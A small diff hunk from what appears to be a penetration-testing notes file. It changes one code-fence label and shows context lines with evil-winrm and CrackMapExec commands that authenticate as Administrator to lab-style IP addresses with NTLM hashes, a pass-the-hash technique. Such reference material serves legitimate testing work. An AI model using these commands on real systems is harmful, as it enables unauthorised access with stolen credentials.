@@ -14,7 +14,7 @@ evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d3372a07ceea
 
 Pass The Hash against the target:
 
-```text
+```bash
 cme smb 172.16.157.25 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51' --local-auth
 ```
 
